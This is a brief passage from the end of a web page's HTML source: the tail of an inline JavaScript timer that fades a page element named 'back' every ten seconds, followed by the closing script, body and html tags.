      ShowObjectWithEffect('back', 0, 'fade', 500);
   }, 10000);
}
function TimerStopTimer1()
{
   clearInterval(wb_Timer1);
}
TimerStartTimer1();
</script>

</body>
</html>